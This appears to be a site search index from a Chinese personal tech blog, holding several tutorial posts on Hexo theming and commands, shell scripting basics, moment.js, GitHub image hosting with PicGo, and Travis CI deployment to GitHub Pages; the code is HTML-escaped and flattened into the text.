环境要求 Hexo：4.2 Node：12 Volantis：2.6 Volantis 低版本可能会不适用于本文介绍的方法，可以参考 YINUXY 的 Hexo主题美化 | 给你的博客加上GITHUB日历云和分类 配置 在主题配置文件 themes\\volantis\\_config.yml 下添加以下内容： 1postCalendar: true 用于设置在归档页面中是否显示’文章日历’控件，如果不想显示，设置为 false 即可。 在归档页面 themes/volantis/layout/archive.ejs 添加以下代码： 12345&lt;div id&#x3D;&quot;calendar&quot;&gt; &lt;% if (theme.postCalendar) &#123; %&gt; &lt;%- partial(&#39;_widget&#x2F;post-calendar&#39;) %&gt; &lt;% &#125; %&gt;&lt;&#x2F;div&gt; 具体添加位置： 这里会根据主题配置文件中的postCalendar的值，来判断是否需要渲染。 点击下载日历样式文件 post-calendar.ejs，放置于themes/volantis/layout/_widget目录下。 将其中的第 16 行，替换成以下内容： 1&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;0xAiKang&#x2F;CDN@1.0&#x2F;blog&#x2F;js&#x2F;echarts.min.js&quot;&gt;&lt;&#x2F;script&gt; 至此已经完成了，使用hexo generate &amp;&amp; hexo server查看是否可以正常加载日历图。 默认的样式是高仿gittee，如果觉得不满意，可以参考官方文档自定义。 参考链接 hexo（sakura）仿gitee添加文章贡献度日历图（echarts）","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/tags/Hexo/"}]},{"title":"编写第一个Shell 脚本","slug":"write-the-first-shell-script","date":"2020-07-08T13:56:46.000Z","updated":"2020-07-08T13:59:47.029Z","comments":true,"path":"write-the-first-shell-script/","link":"","permalink":"https://www.0x2beace.com/write-the-first-shell-script/","excerpt":"这篇笔记用来记录编写 Shell 脚本过程中的一些基础知识。","text":"这篇笔记用来记录编写 Shell 脚本过程中的一些基础知识。 什么是 shell 脚本 Shell 脚本就是将一堆的 Shell 命令以及指定执行 Shell ，通过放在一个文件中来执行。 创建第一个shell 脚本下面我们来创建第一个 shell 脚本： 123456$ vim showdate#! &#x2F;bin&#x2F;bash# this script displays the date and who&#39;s logged ondatewho 大功告成！这样就完成了一个简单的 shell 脚本的创建，是不是很简单！不过有以下几点需要注意： shell 脚本的名称不是一定需要用 .sh 来结尾，只是用 .sh 结尾会让其他人一目了然知道这是一个 shell 脚本文件。 在创建shell 脚本时，必须在第一行指定要使用的 shell，且格式固定为：#!开头。 第二行的井号作为注释行。 运行shell 脚本： 12345678$ lsshowdate$ .&#x2F;showdatebash: permission denied: .&#x2F;showdate$ sudo .&#x2F;showdatesudo: .&#x2F;showdate: command not found$ chmod u+x showdate$ .&#x2F;showdate 创建完 shell 脚本，想要运行，有两种方案： 将 shell 脚本所处的目录添加到 PATH 环境变量中; 在提示符中用绝对路径或者是相对路径来引用 shell 脚本文件; 在上面的例子中，用的是绝对路径的方式来执行shell 脚本，使用单点操作符表示当前目录下的文件。 需要注意的是，因为文件夹权限的关系，而不能直接用 sudo 命令去执行，因为sudo 命令会检查showdate 并不在sudo 命令列表中。 所以正解是：修改该文件的文件夹权限。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"对于Shell编程的理解","slug":"understanding-of-shell-programming","date":"2020-07-08T13:45:40.000Z","updated":"2020-07-08T13:55:36.897Z","comments":true,"path":"understanding-of-shell-programming/","link":"","permalink":"https://www.0x2beace.com/understanding-of-shell-programming/","excerpt":"在开始聊Shell编程之前，我们先来看看计算机编程语言的都有哪些类型。 计算机语言可以分为两大类： 低级语言 高级语言","text":"在开始聊Shell编程之前，我们先来看看计算机编程语言的都有哪些类型。 计算机语言可以分为两大类： 低级语言 高级语言 低级语言包括：机器语言和汇编语言。 高级语言包括：静态语言和动态语言。 这里就不对机器语言和汇编语言做介绍了，今天的主角是高级语言下的动态语言。 动态语言动态语言又叫做脚本语言。 它和传统的静态语言的区别就在于: 12前者的运行过程为：编写-&gt;解释-&gt;执行而后者的运行过程为：编写-&gt;编译-&gt;链接-&gt;执行 脚本语言的优势就在于 只要有一个可以写代码的编辑器和能解释执行的脚本解释器就行了。 这样一想，也就明白了为什么搭建Python的开发环境远比C#要快，因为它只要安装一个解释器就好了。 动态语言与静态语言存在的争议之一： 在静态语言中，写代码时必须知道每个变量的类型; 而在动态语言中，随便什么时候，你都可以把变量设为任意类型的值。 Shell编程最初在学习Shell脚本时，产生过这样一个问题：为什么还能用PHP写Shell脚本？ 当时就很不理解。这里就反应了两个问题： 对PHP的理解不深 对Shell脚本的理解不深 理论上讲，只要一门语言提供了解释器，这门语言就可以胜任脚本编程。 所以用 PHP 可以写 Shell 脚本，就没有什么好奇怪的了。你可能会问：这句话里面的 Shell怎么理解？ 还记得吗，Shell的概念是什么？ Shell 脚本就是将一堆的 Shell 命令以及指定执行 Shell ，通过放在一个文件中来执行。 脚本语言的分类脚本语言又可以分为以下两大类： Shell脚本 通用动态语言 常见的Shell脚本： sh bash csh ksh tcsh zsh AppleScript 常见的脚本语言 JavaScript Perl PHP Python Ruby VBScript","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"关于Linux的Shell、Shell脚本、Shell环境的理解","slug":"understanding-of-linux-shell-shell-script-shell-environment","date":"2020-07-08T13:40:01.000Z","updated":"2020-07-08T13:52:22.046Z","comments":true,"path":"understanding-of-linux-shell-shell-script-shell-environment/","link":"","permalink":"https://www.0x2beace.com/understanding-of-linux-shell-shell-script-shell-environment/","excerpt":"如标题所示，这片笔记主要目的是加深对Linux的Shell、Shell脚本、Shell环境的理解。","text":"如标题所示，这片笔记主要目的是加深对Linux的Shell、Shell脚本、Shell环境的理解。 什么是Shell？ 在回答这个问题之前，我们先来考虑一个问题：人是如何跟计算机打交道的？或者说怎样让计算机按照我们的要求完成某个任务？ 现在和计算机交互的方式很简单，直接用图形界面的工具就好了，想要计算机完成某个任务，通过操作图形界面的工具就能到达目的。 那么在以前呢？在那个计算机还没有这么先进的时代呢？人们又是如何让计算完成某个任务。通过“命令”的方式告诉计算机我需要你帮你完成这件事。这个“命令”又是怎么告诉计算机的呢？通过一个交互工具。这个工具可以实现与计算机之间的“你问我答，你说我做”的功能。 Shell就是一种应用程序（注意：我这里用的是一种）。 这个应用程序提供了一个界面（方便我们与计算机进行交互），用户通过这个界面访问操作系统内核的服务。 什么是Shell脚本？Shell 脚本（Shell Script），是一种为 Shell 编写的脚本程序。 Shell 脚本编程有两种方式 交互式（Interactive）：用户每输入一条命令就立即执行。 批处理（Batch）：由用户事先编写好一个完整的Shell脚本，Shell会一次性执行脚本中诸多的命令。 什么是Shell环境Shell编程跟java、php编程一样，只要有一个能编写代码的文本编辑器和一个能解释执行的脚本解释器就可以了。 0x01 Linux Linux 默认安装了 Shell 解释器。 在Linux中，主流的 Shell 是 Bash。 在一般情况下，人们并不区分 Bourne Shell 和 Bourne Again Shell，所以，像 #!/bin/sh，它同样也可以改为 #!/bin/bash。 0x02 Mac OS Mac OS不仅带了sh、bash这两个最基础的解释器，还内置了ksh、csh、zsh等不常用的解释器。 0x03 WindowsWindows 出厂时没有内置 Shell 解释器，通常我们都是安装cygwin或者mingw 模拟器来Linux环境。 Cygwin Mingw 如Git的交互界面就是由Mingw模拟器提供的Bash。 脚本解释器12345bash &#x3D;&gt; Bourne Again Shell（&#x2F;bin&#x2F;bash）sh &#x3D;&gt; Bourne Shell（&#x2F;usr&#x2F;bin&#x2F;sh或&#x2F;bin&#x2F;sh）csh &#x3D;&gt; C Shell（&#x2F;usr&#x2F;bin&#x2F;csh）ksh &#x3D;&gt; K Shell（&#x2F;usr&#x2F;bin&#x2F;ksh）Shell for Root（&#x2F;sbin&#x2F;sh） 第一个Shell脚本打开Bash或者任何一个文本编辑器，新建一个文件 Hello.sh，扩展名为sh(sh代表shell)。 123456#!&#x2F;bin&#x2F;bash#第一个Shell脚本#作用是列出当前目录下的所有文件的详情信息PWDS&#x3D;echo &#96;pwd&#96;cd $PWDSls -l 上面这个脚本中，有三种不同的元素： 第一行的脚本声明（#!）用来告诉系统使用哪种 Shell 解释器来执行该脚本； 第二行的注释信息（#）是对脚本功能和某些命令的介绍信息，使得看到脚本时能快速反应是做什么的。 剩下没有前缀标识的就是 所要执行的脚本具体命令了。 运行Shell脚本有两种方式： 1. 作为可执行程序12$ chmod +x example.sh # 使脚本具有执行权限$ .&#x2F;example.sh # 执行脚本 2. 作为解释器参数这种运行方式是，直接运行解释器，其参数就是shell脚本的文件名: 1234# 执行脚本$ &#x2F;bin&#x2F;sh example.sh$ bash example.sh$ bash example.php 使用这种方式时，可以不用在脚本第一行声明解释器信息。 12345678$ cat example.php#这是一个用php写的Shell脚本，有两个作用#1.确认是否用解释器参数执行shell脚本可以不用写声明#2.确认如何用php写shell脚本string&#x3D;&quot;php shell&quot;echo $string$ bash example.phpphp shell","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"moment.js 用法总结","slug":"moment-js-usage-summary","date":"2020-07-07T10:59:32.000Z","updated":"2020-07-08T16:31:53.649Z","comments":true,"path":"moment-js-usage-summary/","link":"","permalink":"https://www.0x2beace.com/moment-js-usage-summary/","excerpt":"最近在做的一个前端项目，经常会遇到对时间的处理，因为原生的时间格式处理起来很费劲，所以引入了一个轻量级的日期处理类库。 momentjs 支持日期格式化、Date、时间戳等相互转换，它使得操作时间变得非常简单。","text":"最近在做的一个前端项目，经常会遇到对时间的处理，因为原生的时间格式处理起来很费劲，所以引入了一个轻量级的日期处理类库。 momentjs 支持日期格式化、Date、时间戳等相互转换，它使得操作时间变得非常简单。 快速上手momentjs支持多个环境，所有的代码都应该在这两种环境中都可以工作。 Node.js12npm install momentvar moment &#x3D; require(&#39;moment&#39;); 浏览器1&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;moment.js&#x2F;2.9.0&#x2F;moment.js&quot;&gt;&lt;&#x2F;script&gt; 实例获取当前的日期和时间： 创建1moment(); 相当于moment(new Date()) 此处会返回一个moment封装的日期对象。 格式化1234567moment().format(&#39;YYYY年MM月DD日 HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020年07月07日 07:49:38&quot;moment().format(&#39;YYYY-MM-DD HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020-07-07 07:50:57&quot;moment().format(&#39;YYYY&#x2F;MM&#x2F;DD HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020&#x2F;07&#x2F;07 07:51:17&quot;moment().format(&#39;hh:m:ss&#39;) &#x2F;&#x2F; &quot;07:51:34&quot;moment().format(&#39;YYYY&#39;) &#x2F;&#x2F; &quot;2020&quot;moment().format(&#39;d&#39;) &#x2F;&#x2F; 2，今天是周二moment().format(&#39;X&#39;) &#x2F;&#x2F; 获取当前时间的Unix时间戳 转换为Date对象1234moment().toDate() &#x2F;&#x2F; Mon Jan 22 2018 18:11:55 GMT+0800 (中国标准时间)moment(&#39;2018-01-20&#39;).toDate() &#x2F;&#x2F; Tue Jan 20 2015 00:00:00 GMT+0800 (中国标准时间)moment(&#39;2018-01-22 10:20:15&#39;).toDate() &#x2F;&#x2F; Mon Jan 22 2018 10:20:15 GMT+0800 (中国标准时间)moment(1448896064621).toDate() &#x2F;&#x2F;毫秒转日期 获取时间信息123456789moment().second() &#x2F;&#x2F; 获取当前这一分钟的多少秒moment().date() &#x2F;&#x2F; 获取天moment().day() &#x2F;&#x2F; 获取星期moment().dayOfYear() &#x2F;&#x2F; 一年内的多少天moment().week() &#x2F;&#x2F; 一年里的多少周moment().month() &#x2F;&#x2F; 获取当前月份（实际月份-1）moment().quarter() &#x2F;&#x2F; 一年内的第几个季度moment().year() &#x2F;&#x2F; 获取年份moment().daysInMonth() &#x2F;&#x2F; 获取当月天数 显示一旦解析和操作完成后，需要某些方式来显示 moment。 使用format来格式化日期： 123456moment().format() &#x2F;&#x2F; &quot;2020-07-07T08:24:35+08:00&quot;moment.unix(timestamp).format(&#39;YYYY-MM-DD HH:mm:ss&#39;); &#x2F;&#x2F; 将Unix 时间戳转换为日期格式moment(timestamp).format(&#39;YYYY-MM-DD HH:mm:ss&#39;); &#x2F;&#x2F; 将Unix 毫秒时间戳转换为日期格式moment().unix(); &#x2F;&#x2F; 获取Unix 时间戳moment().format(&quot;X&quot;); &#x2F;&#x2F; 获取Unix 时间戳moment().format(&quot;x&quot;); &#x2F;&#x2F; 获取Unix 毫秒时间戳","categories":[{"name":"前端","slug":"前端","permalink":"https://www.0x2beace.com/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://www.0x2beace.com/tags/JavaScript/"}]},{"title":"如何选择一个适合自己的图床","slug":"how-to-choose-a-picture-bed-that-suits-you","date":"2020-07-06T15:06:33.000Z","updated":"2020-07-10T05:36:37.965Z","comments":true,"path":"how-to-choose-a-picture-bed-that-suits-you/","link":"","permalink":"https://www.0x2beace.com/how-to-choose-a-picture-bed-that-suits-you/","excerpt":"因为没有把博客部署在服务器上，而是选择GitHub Pages 的方式，所以如果遇到需要插入图片的时候，只能通过图床来存储图片。 如果不是因为SM.MS 图床在今天突然挂掉了，我可能都不会去想是否需要更换图床这个问题。 于是我开始寻找一个免费、稳定的图床，最后在众多图床中，最后选择了GitHub 图床。 使用GitHub 图床，可能唯一的问题是需要自备好科学上网工具，否则图片无法加载。","text":"因为没有把博客部署在服务器上，而是选择GitHub Pages 的方式，所以如果遇到需要插入图片的时候，只能通过图床来存储图片。 如果不是因为SM.MS 图床在今天突然挂掉了，我可能都不会去想是否需要更换图床这个问题。 于是我开始寻找一个免费、稳定的图床，最后在众多图床中，最后选择了GitHub 图床。 使用GitHub 图床，可能唯一的问题是需要自备好科学上网工具，否则图片无法加载。 为什么不选择国内的那些图床服务？ 我只是想存一些图片，而国内的大部分图床服务，还需要做域名备案以及绑定各种服务，感觉很繁琐，加上我的域名不是在国内的域名服务商那里买的，索性就没有考虑国内的图床服务。 图床管理工具有了图床，就需要顺手配置一个图床管理工具，这里我选择的是 PicGo，仅目前支持的图床就有：SM.MS图床，微博图床，七牛图床，腾讯云COS，阿里云OSS，Imgur，又拍云，GitHub 图床等。 创建GitHub 图床首先，你得有一个GitHub 账号。 1. 新建一个仓库这个仓库是用于存储图片，最好是public，因为private的仓库，图片链接会带token，而这个token会存在过期的问题。 2. 获取授权token通过Settings-&gt;Developer settings-&gt;Personal access tokens 创建一个新的token 用于PicGo操作你的仓库。 把repo的勾打上即可，点击Generate token的绿色按钮生成 token。 创建成功后，会生成一串token，这串token之后不会再显示，所以第一次看到的时候最好保存好。 配置PicGoGitHub 图床的配置还是比较简单的，下面是参数说明。 仓库名：你的图床仓库的名称，格式为：username/repository 分支名：一般选择默认分支 master Token：刚才生成的 Token 存储路径：指定存放在仓库的哪个目录下 自定义域名：raw.githubusercontent.com/username/repository/branch 自定义域名最好按照一定的规则去定义：raw.githubusercontent.com+你的github用户名+仓库名称+分支名称 raw.githubusercontent.com 是github用来存储用户上传文件的服务地址，是github 的素材服务器 (assets server)。 通常配置完成之后，就可以直接使用了。 如果你上传失败的情况，可以打开PicGo 的日志看看具体是什么异常 如果得到了这样的异常，那么大概率是因为你没有开启全局代理。 1[PicGo ERROR] RequestError: Error: connect ECONNREFUSED 13.250.168.23:443&#96; 因为GitHub 服务器和国内 GFW 的问题会导致有时上传成功，有时上传失败，所以需要自备好科学上网工具。 如果你还有其他问题，可以查阅 PicGo FAQ。 总结 如果你和我一样，讨厌域名备案，又希望能有一个免费、稳定的图床，那么一定不要错过GitHub 图床。 如果你只是需要存储一些不怎么重要的图片，那么可以使用免费不限大小的SM.MS图床。 如果打算长期稳定使用可以优先选择又拍云或者七牛云。","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"},{"name":"Skill","slug":"Tutorial/Skill","permalink":"https://www.0x2beace.com/categories/Tutorial/Skill/"},{"name":"GitHub","slug":"Tutorial/Skill/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/Skill/GitHub/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"}]},{"title":"Travis CI 快速上手","slug":"travis-ci-quick-start","date":"2020-07-05T06:25:58.000Z","updated":"2020-07-09T13:12:54.040Z","comments":true,"path":"travis-ci-quick-start/","link":"","permalink":"https://www.0x2beace.com/travis-ci-quick-start/","excerpt":"最近使用Github Pages 搭建Hexo 时，用到了一项新技术。hmm…也不能说是新技术吧，只是之前一直有听说，但却没有实际用过。 它就是持续集成，听上去好像是一个高大上的概念，但通俗一点解释就是：写完代码提交之后，会根据你的要求，自动做编译测试。 其中最出名大概就是Travis CI了，本文的目的就是快速入门 Travis CI。","text":"最近使用Github Pages 搭建Hexo 时，用到了一项新技术。hmm…也不能说是新技术吧，只是之前一直有听说，但却没有实际用过。 它就是持续集成，听上去好像是一个高大上的概念，但通俗一点解释就是：写完代码提交之后，会根据你的要求，自动做编译测试。 其中最出名大概就是Travis CI了，本文的目的就是快速入门 Travis CI。 什么是持续集成？持续集成(Continuous Integration)是对小周期的的代码进行更改，其目的是通过以较小的增量开发和测试来构建更健康的软件。 而Travis CI 作为一个持续集成平台，通过自动构建和测试代码，并提供更改成功的即时反馈。 快速上手在正式开始之前，需要提前准备好以下先决条件： 一个 GitHub 帐户 托管在 Github 的项目的所有者权限 需要注意的是：Travis CI不是完全免费的服务，前100个私有构建是免费的，后续就要进行付费，如果你的项目是开源的，或者你是学生，则不受限制。 在Github 上使用Travis CI 将 Travis CI 添加到你的 GitHub 账户中。 前往 GitHub 的 Applications settings，配置 Travis CI 权限，使其能够访问你的 repository。 前往 GitHub 新建 Personal Access Token，只勾选 repo 的权限并生成一个新的 Token。Token 生成后请复制并保存好。 回到 Travis CI，前往你的 repository 的设置页面，在 Environment Variables 下新建一个环境变量，Name 为 GH_TOKEN，Value 为刚才你在 GitHub 生成的 Token。确保 DISPLAY VALUE IN BUILD LOG 保持 不被勾选 避免你的 Token 泄漏。点击 Add 保存。 在你的项目中新建一个 .travis.yml 文件。 提交并推送以触发Travis CI构建。 其中.travis.yml文件的目的是告诉 Travis CI 应该做些什么。 以下示例指定了应使用Ruby 2.2和最新版本的JRuby构建的Ruby项目。 1234language: rubyrvm: - 2.2 - jruby 通过访问Travis CI 并选择repository，检查构建状态页面，以根据构建命令的返回状态查看构建是否通过或失败。","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"CI","slug":"CI","permalink":"https://www.0x2beace.com/tags/CI/"}]},{"title":"Hexo 快速上手","slug":"hexo-quick-start","date":"2020-07-05T06:16:31.000Z","updated":"2020-08-15T01:05:05.993Z","comments":true,"path":"hexo-quick-start/","link":"","permalink":"https://www.0x2beace.com/hexo-quick-start/","excerpt":"最近使用Hexo 搭建了一套博客系统，整个过程还算顺利，不过还是遇到了一些问题，整理记录一下。","text":"最近使用Hexo 搭建了一套博客系统，整个过程还算顺利，不过还是遇到了一些问题，整理记录一下。 常用命令init新建一个网站。如果没有设置 folder，Hexo 默认在目前的文件夹建立网站。 1$ hexo init [folder] newlayout 有三种选择： post：新建一片文章 page：新建一个页面 draft：新建一篇草稿 如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。 1$ hexo new [layout] &lt;title&gt; generate生成静态文件。 12$ hexo generate&#x2F;&#x2F; 等效于 hexo g 常用参数：|选项|描述||-|-||-d, –deploy|文件生成后立即部署网站||-w, –watch|监视文件变动||-b, –bail|生成过程中如果发生任何未处理的异常则抛出异常| publish发表草稿 1$ hexo publish [layout] &lt;filename&gt; server启动服务器。默认情况下，访问网址为： http://localhost:4000/。 12$ hexo server&#x2F;&#x2F; 等效于 hexo s deploy部署网站。 12$ hexo deploy&#x2F;&#x2F; 等效于 hexo d -g，--generate：部署之前预先生成静态文件 clean清除缓存文件 (db.json) 和已生成的静态文件 (public)。 在某些情况（尤其是更换主题后），如果发现对站点的更改无论如何也不生效，那可能需要运行该命令。 1$ hexo clean list列出网站资料。 1$ hexo list version显示 Hexo 版本。 1$ hexo version 其他模式安全模式在安全模式下，不会载入插件和脚本。当需要安装新插件遭遇问题时，可以尝试以安全模式重新执行。 1$ hexo --safe 调试模式在终端中显示调试信息并记录到 debug.log。 1$ hexo --debug 显示草稿显示 source/_drafts 文件夹中的草稿文章。 1$ hexo --draft 常见问题CNAME 文件被删除GitHub Pages 为我们免费提供了&lt;username&gt;.github.io这样的域名作为 GitHub Page，但如果你觉得这个域名太长了，不满意，那么你也可以绑定自己的域名。 通常绑定完成之后，会在项目目录下面生成一个叫做CNAME的文件，这个文件的作用就是用来记录GitHub Pages 所绑定的域名。 这个时候就会产生一个问题： CNAME文件会在每次 hexo deploy 时消失，然后需要重新手动绑定，这样就很繁琐。 有以下几种方式可以解决这个问题： 每次 hexo d 之后，就去 GitHub 仓库根目录新建 CNAME文件。—— 繁琐 在 hexo g 之后， hexo d 之前，把CNAME文件复制到 public 目录下面，里面写入你要绑定的域名。—— 繁琐 将需要上传至 GitHub 的内容放在source文件夹，例如CNAME、favicon.ico、images等，这样在 hexo d 之后就不会被删除了。 通过安装插件实现永久保留。 1$ npm install hexo-generator-cname --save 编辑_config.yml 12Plugins:- hexo-generator-cname 推荐第三种方式，简单方便。 配置apex 域Github Pages 是支持绑定自己的私有域名的，但默认只能绑定 CNAME的私有子域名，那有没有办法主域名呢？ 答案是有的。 如果绑定主域名，例如 example.com，建议还设置一个 www 子域，GitHub Pages 将自动在域之间创建重定向，当输入example.com时，会重定向到 www.example.com。 通常我们绑定好私有子域名之后，回生成一个CNAME的文件，里面记录着我们绑定好的私有子域名。 此时只需要去DNS 做解析，创建一个ALIAS、ANAME 或 A 记录： 创建ALIAS、ANAME记录：将 apex 域指向站点的默认域。 创建A 记录：将 apex 域指向 GitHub Pages 的 IP 地址。 12345&#x2F;&#x2F; GitHub Pages 的 IP 地址185.199.108.153185.199.109.153185.199.110.153185.199.111.153 这里我选择的是创建A 记录，所以我的DNS 解析是这样的： 配置完DNS 解析之后，可以使用dig命令来检验是否解析成功： 12345678$ dig example.com +noall +answer; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; 0x2BeAce.com +noall +answer;; global options: +cmd0x2BeAce.com. 4502 IN A 185.199.111.1530x2BeAce.com. 4502 IN A 185.199.110.1530x2BeAce.com. 4502 IN A 185.199.108.1530x2BeAce.com. 4502 IN A 185.199.109.153 将example.com 替换成你自己的 apex 域，确认结果与上面 GitHub Pages 的 IP 地址相匹配。 至此，就完成了apex 域的配置了。 参考链接 github+hexo搭建自己的博客网站（七）注意事项 Hexo | 指令 管理 GitHub Pages 站点的自定义域","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/tags/Hexo/"}]},{"title":"Github Pages 部署 Hexo 个人博客","slug":"deploy-hexo-using-github-pages-personal-blog","date":"2020-07-04T12:09:09.000Z","updated":"2020-08-15T01:11:07.291Z","comments":true,"path":"deploy-hexo-using-github-pages-personal-blog/","link":"","permalink":"https://www.0x2beace.com/deploy-hexo-using-github-pages-personal-blog/","excerpt":"关于个人博客，在很久之前就想自己搭建一套，甚至还为此买了一台服务器，但奈何自己太忙了(tai lan le) =_=，这件事情就一直搁浅了，服务器大部分时间也都是空闲状态。 这段时间，突然很想把这件事情做好，觉得不能在这么拖下去了，所以便有了这篇文章。","text":"关于个人博客，在很久之前就想自己搭建一套，甚至还为此买了一台服务器，但奈何自己太忙了(tai lan le) =_=，这件事情就一直搁浅了，服务器大部分时间也都是空闲状态。 这段时间，突然很想把这件事情做好，觉得不能在这么拖下去了，所以便有了这篇文章。 为什么使用Github Pages？ 我是出于以下原因考虑的： 暂时没有服务器的需要，我只想有一个能写博客的地方。 GitHub Pages 可以提供 https服务，我不用担心域名备案的问题。 免费 总之，如果你想用最简单、最省心的方式，搭建属于自己的博客，那么 Github Pages 一定不会让你失望。 系统环境 Mac OS 10.15.4 Node.js 12 Hexo-cli: 3.1 NPM: 6.9 创建Github PagesGithub Pages分为两类，用户或组织主页、项目主页。 用户或组织主页：在新建仓库时，仓库名称应该以&lt;yourusername&gt;.github.io的格式去填写。&lt;yourusername&gt;指的是你的Github 的用户名称。 创建项目主页：在新建仓库时，名称可以任意设置，然后通过Setting-&gt;Options-&gt;Github Pages将 Source选项设置为Master Branch，此时这个项目就变成一个 Github Pages项目了。 需要注意的是： Github Pages 只针对开源的项目是免费的，如果你不想开源，那可能就需要考虑收费的套餐了。 第一种方式不能更改 Github Pages 部署分支。 如果你有自己的域名，那么推荐使用方式二创建 Github Pages。如果你没有自己的域名，那也没有关系，可以使用Github Pages 提供的域名访问http://&lt;yourusername&gt;.github.io。 绑定域名如果你是通过方式一，创建的Github Pages，那么可以跳过此部分。 在 2018 年 5 月 1 日之后，GitHub Pages 已经开始提供免费为自定义域名开启 HTTPS 的功能，并且大大简化了操作的流程，现在用户已经不再需要自己提供证书，只需要将自己的域名使用 CNAME 的方式指向自己的 GitHub Pages 域名即可。 首先需要在你的 DNS 解析里添加一条解析记录，例如我选择添加子域名blog.aikang.me，通过 CNAME 的方式指向我刚刚自定义的 GitHub Pages 域名 0xAiKang.github.io。 添加完成后等待 DNS 解析的生效的同时回到项目的Setting界面，将刚才的子域名与 Github Pages 绑定在一起。 保存之后，我们只需要耐心等待 GitHub 生成证书并确认域名的解析是否正常。 将Hexo 部署到Github Pages域名解析成功之后，就可以通过我们刚才绑定的域名进行访问了，但是你会发现，现在只能看到一片空白，这是因为我们的网站还没有任何内容，所以下一步需要做的就是选择一套静态模版系统。 目前市场上有很多优秀的静态模板系统，比如： Node.js 编写的 Hexo Go 编写的 Hugo Python 编写的 Pelican 静态博客写作客户端 Gridea 为什么要选择Hexo？ 最初在选择博客模版系统时，并没有发现 Gridea ，事后发现这个小众的静态博客写作客户端似乎才是我真正想要的。 不过既然选择了Hexo，也是因为它的生态环境很大，可选主题非常多，并且都是开源的。 如何将 Hexo 部署到 GitHub Pages？ 将 Travis CI 添加到你的 GitHub 账户中。 前往 GitHub 的 Applications settings，配置 Travis CI 权限，使其能够访问你的 repository。 正常情况下你会被重定向到 Travis CI 的页面。如果没有，请 手动前往。 前往 GitHub 新建 Personal Access Token，只勾选 repo 的权限并生成一个新的 Token。Token 生成后请复制并保存好。 回到 Travis CI，前往你的 repository 的设置页面，在 Environment Variables 下新建一个环境变量，Name 为 GH_TOKEN，Value 为刚才你在 GitHub 生成的 Token。确保 DISPLAY VALUE IN BUILD LOG 保持 不被勾选 避免你的 Token 泄漏。点击 Add 保存。 在你的 Hexo 站点文件夹中新建一个 .travis.yml 文件： 123456789101112131415161718sudo: falselanguage: node_jsnode_js: - 10 # use nodejs v10 LTScache: npmbranches: only: - master # build master branch onlyscript: - hexo generate # generate static filesdeploy: provider: pages skip-cleanup: true github-token: $GH_TOKEN keep-history: true on: branch: master local-dir: public 上面这个配置文件的作用是用来自动构建，编译测试。 将 .travis.yml 推送到 repository 中。Travis CI 会自动开始运行，并将生成的文件推送到同一 repository 下的 gh-pages 分支下。 修改发布源推送完成之后，会发现多了一个 gh-gages分支，这个分支就是用于部署站点的分支，但是GitHub Pages 会默认使用master分支作为发布源，所以我们需要切换发布源。 在Setting-&gt;Option-&gt;GitHub Pages下，使用 Source（源）下拉菜单选择发布源。 注意：使用用户或组织主页构建的 Github Pages 不能修改发布源，只能使用默认的 master分支。 一键部署Hexo 提供了快速方便的一键部署功能，让你只需一条命令就能将网站部署到服务器上。 在正式部署之前，我们需要先修改_config.yml 文件，配置参数。 12345deploy: type: git repo: &lt;repository url&gt; #https:&#x2F;&#x2F;bitbucket.org&#x2F;JohnSmith&#x2F;johnsmith.bitbucket.io branch: [branch] message: [message] 参数 描述 默认值 type deployer - repo 项目地址 - branch 分支名称 gh-pages 有以下两点需要注意：1.repo 需要选择SSH 协议，HTTPS协议会报错。2.branch 选择Github Pages中设置的那个分支，而不是拉取这个项目的分支 我这里使用的是git 